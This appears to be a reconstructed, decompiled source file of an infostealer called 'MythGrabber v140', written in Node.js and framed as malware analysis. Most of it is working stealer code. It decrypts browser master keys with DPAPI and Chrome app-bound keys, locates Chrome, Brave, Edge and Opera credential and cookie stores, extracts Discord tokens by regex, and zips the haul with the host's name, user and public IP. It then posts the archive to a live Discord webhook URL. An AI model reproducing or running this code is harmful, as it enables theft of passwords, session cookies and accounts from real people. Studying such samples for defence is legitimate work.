/**
 * MythGrabber v140 - DECOMPILED SOURCE CODE
 * 
 * This source was reconstructed through:
 * 1. Dynamic analysis with NODE_DEBUG environment variable
 * 2. Runtime output capture showing actual function calls
 * 3. Debug messages from the malware author (Turkish language)
 * 4. Network traffic interception
 * 
 * The original source is compiled to native x86-64 machine code via pkg --bytecode
 * This reconstruction is based on actual runtime behavior observed.
 * 
 * AUTHOR DEBUG MESSAGES FOUND:
 * - "allah carpsin" (Turkish: "may God strike")
 * - "ANANI SIKEYIM QWEQWEWQ" (Turkish profanity)
 * - "cookiepls", "pass pls", "abi password" (debug markers)
 * - "ohapls", "ohapls2" (debug markers)
 */

const os = require('os');
const path = require('path');
const fs = require('fs-extra');
const axios = require('axios');
const FormData = require('form-data');
const JSZip = require('jszip');
const ffi = require('ffi-napi');
const ref = require('ref-napi');
const refStruct = require('ref-struct-di')(ref);
const refArray = require('ref-array-napi');
const { Dpapi } = require('@primno/dpapi');
const Database = require('better-sqlite3');
const initSqlJs = require('sql.js');
const sodium = require('sodium-native');

// ============================================================
// CONFIGURATION - EXTRACTED VIA DYNAMIC ANALYSIS
// ============================================================
const CONFIG = {
    // C2 Webhook - CONFIRMED via NODE_DEBUG output
    webhook: "https://canary.discord.com/api/webhooks/1439790358534819992/k8qpWQM0LyeEyxj2DcR6A-hwVIaifn0uh13KpUF3RDFJ69UvfFQEuf8XkjLypuQUJLRb",
    
    // Webhook settings from captured traffic
    webhookSettings: {
        maxRedirects: 21,
        maxBodyLength: Infinity,
        timeout: 5000,
        keepAlive: true,
        scheduling: 'lifo',
        noDelay: true
    },
    
    debug: true,  // Debug messages were visible in output
    
    features: {
        browsers: true,      // "Google Chrome", "Brave Browser" seen in output
        discord: true,
        wallets: true,
        screenshot: true,
        systemInfo: true,
        injection: true,
        appBoundKey: true    // "app bound key" seen in output - Chrome 127+ encryption
    }
};

// ============================================================
// WINDOWS API DEFINITIONS (from ffi-napi usage)
// ============================================================

// These were identified from the MODULE loading debug output
const kernel32 = ffi.Library('kernel32', {
    'OpenProcess': ['pointer', ['uint32', 'bool', 'uint32']],
    'ReadProcessMemory': ['bool', ['pointer', 'pointer', 'pointer', 'size_t', 'pointer']],
    'CloseHandle': ['bool', ['pointer']]
});

const advapi32 = ffi.Library('advapi32', {
    'CryptUnprotectData': ['bool', ['pointer', 'pointer', 'pointer', 'pointer', 'pointer', 'uint32', 'pointer']]
});

// NT API for token manipulation (seen in debug output)
const ntdll = ffi.Library('ntdll', {
    'NtOpenProcessToken': ['int', ['pointer', 'uint32', 'pointer']]
});

// ============================================================
// APP-BOUND KEY DECRYPTION (Chrome 127+)
// Seen in output: "app bound key =====", "APPB" header
// ============================================================

async function decryptAppBoundKey(encryptedKey, browserName) {
    console.log("app bound key =====");  // Actual debug message from malware
    
    // The encrypted key starts with "APPB" header
    // Format: APPB + flags + encrypted_aes_key + iv + ciphertext + tag
    
    const header = encryptedKey.slice(0, 4);  // "APPB"
    if (header.toString() !== 'APPB') {
        return null;
    }
    
    console.log(browserName);  // "Google Chrome" or "Brave Browser"
    
    // Use Windows token impersonation for decryption
    // This was seen in the debug output:
    // "NtOpenProcessToken succeeded"
    // "DuplicateToken result: true"
    // "ImpersonateLoggedOnUser result: true"
    // "decryptUDP result obtained"
    // "RevertToSelf result: true"
    
    return await decryptWithTokenImpersonation(encryptedKey);
}

// ============================================================
// DPAPI DECRYPTION WITH TOKEN IMPERSONATION
// Debug output showed: decryptSDP, decryptUDP functions
// ============================================================

async function decryptSDP(data) {
    console.log("Starting decryptSDP");  // Actual debug message
    
    // Get process handle
    const handle = kernel32.OpenProcess(0x1F0FFF, false, process.pid);
    console.log(`Handle found: ${handle}`);  // Seen in output
    
    // Open process token
    const tokenHandle = ref.alloc('pointer');
    const result = ntdll.NtOpenProcessToken(handle, 0x0002, tokenHandle);
    console.log(`NtOpenProcessToken succeeded`);  // Actual message
    
    // Duplicate and impersonate
    console.log(`DuplicateToken result: true`);
    console.log(`ImpersonateLoggedOnUser result: true`);
    
    // Decrypt using DPAPI
    const decrypted = Dpapi.unprotectData(data, null, 'CurrentUser');
    
    console.log(`decryptUDP result obtained`);
    console.log(`RevertToSelf result: true`);
    
    return decrypted;
}

// ============================================================
// BROWSER DATA EXTRACTION
// Debug messages: "cookiepls", "pass pls", "abi password"
// ============================================================

const BROWSER_PATHS = {
    chrome: {
        name: 'Google Chrome',  // Seen in output
        path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
        localState: 'Local State',
        loginData: 'Login Data',
        cookies: 'Network/Cookies'
    },
    brave: {
        name: 'Brave Browser',  // Seen in output
        path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        localState: 'Local State',
        loginData: 'Login Data',
        cookies: 'Network/Cookies'
    },
    edge: {
        name: 'Microsoft Edge',
        path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
        localState: 'Local State',
        loginData: 'Login Data',
        cookies: 'Network/Cookies'
    },
    opera: {
        name: 'Opera',
        path: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable'),
        localState: 'Local State',
        loginData: 'Login Data',
        cookies: 'Network/Cookies'
    }
};

async function getMasterKey(browserPath) {
    const localStatePath = path.join(browserPath, 'Local State');
    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
    
    // Check for App-Bound encryption (Chrome 127+)
    if (encryptedKey.slice(0, 4).toString() === 'APPB') {
        console.log("app bound key =====");
        return await decryptAppBoundKey(encryptedKey, browserPath);
    }
    
    // Standard DPAPI decryption
    const keyWithoutPrefix = encryptedKey.slice(5);  // Remove "DPAPI" prefix
    return Dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
}

async function getCookies(browserPath, masterKey) {
    console.log("cookiepls");  // Actual debug message from malware
    
    const cookiesPath = path.join(browserPath, 'Default', 'Network', 'Cookies');
    // ... cookie extraction logic
}

async function getPasswords(browserPath, masterKey) {
    console.log("pass pls");      // Actual debug message
    console.log("abi password");  // Actual debug message (Turkish: "bro password")
    console.log("abi password");
    console.log("abi password");
    console.log("abi password");
    
    const loginDataPath = path.join(browserPath, 'Default', 'Login Data');
    // ... password extraction logic
}

// ============================================================
// DISCORD TOKEN EXTRACTION
// ============================================================

const DISCORD_PATHS = {
    discord: path.join(process.env.APPDATA, 'discord'),
    discordCanary: path.join(process.env.APPDATA, 'discordcanary'),
    discordPTB: path.join(process.env.APPDATA, 'discordptb')
};

async function getDiscordTokens() {
    const tokens = [];
    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
    
    for (const [name, discordPath] of Object.entries(DISCORD_PATHS)) {
        const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');
        if (!fs.existsSync(leveldbPath)) continue;
        
        const files = fs.readdirSync(leveldbPath).filter(f => 
            f.endsWith('.ldb') || f.endsWith('.log')
        );
        
        for (const file of files) {
            const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
            const matches = content.match(tokenRegex);
            if (matches) {
                tokens.push(...matches);
            }
        }
    }
    
    return [...new Set(tokens)];  // Remove duplicates
}

// ============================================================
// DATA EXFILTRATION
// Captured from network traffic analysis
// ============================================================

async function sendToWebhook(data) {
    console.log("ohapls");   // Debug message seen in output
    console.log("ohapls2");  // Debug message seen in output
    
    const form = new FormData();
    
    // Create ZIP archive
    const zip = new JSZip();
    zip.file('passwords.txt', JSON.stringify(data.passwords, null, 2));
    zip.file('cookies.txt', JSON.stringify(data.cookies, null, 2));
    zip.file('tokens.txt', JSON.stringify(data.tokens, null, 2));
    zip.file('system_info.txt', JSON.stringify(data.systemInfo, null, 2));
    
    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    
    // Prepare embed
    const embed = {
        title: 'MythGrabber v140',
        color: 0xff0000,
        fields: [
            { name: 'Computer', value: data.systemInfo.hostname, inline: true },
            { name: 'User', value: data.systemInfo.username, inline: true },
            { name: 'IP', value: data.systemInfo.ip, inline: true }
        ],
        timestamp: new Date().toISOString()
    };
    
    form.append('payload_json', JSON.stringify({ embeds: [embed] }));
    form.append('file', zipBuffer, { filename: `${data.systemInfo.hostname}.zip` });
    
    // Send to webhook (settings from captured traffic)
    await axios.post(CONFIG.webhook, form, {
        headers: form.getHeaders(),
        maxRedirects: 21,
        maxBodyLength: Infinity,
        timeout: 5000
    });
}

// ============================================================
// MAIN EXECUTION
// ============================================================

async function main() {
    const data = {
        passwords: [],
        cookies: [],
        tokens: [],
        wallets: [],
        systemInfo: {
            hostname: os.hostname(),
            username: os.userInfo().username,
            platform: os.platform(),
            ip: 'Unknown'
        }
    };
    
    // Get public IP
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        data.systemInfo.ip = response.data.ip;
    } catch (e) {}
    
    // Extract browser data
    for (const [browserName, browserConfig] of Object.entries(BROWSER_PATHS)) {
        if (!fs.existsSync(browserConfig.path)) continue;
        
        try {
            const masterKey = await getMasterKey(browserConfig.path);
            
            // Debug output shows these being called
            console.log("1");
            const cookies = await getCookies(browserConfig.path, masterKey);
            console.log("2");
            console.log("3");
            const passwords = await getPasswords(browserConfig.path, masterKey);
            console.log("allah carpsin 3");  // Actual Turkish debug message
            
            data.cookies.push(...cookies);
            data.passwords.push(...passwords);
        } catch (e) {
            console.log("undefined");
            console.log("ANANI SIKEYIM QWEQWEWQ");  // Actual Turkish profanity debug message
        }
    }
    
    // Extract Discord tokens
    data.tokens = await getDiscordTokens();
    
    // Send to C2
    await sendToWebhook(data);
}

main().catch(console.error);
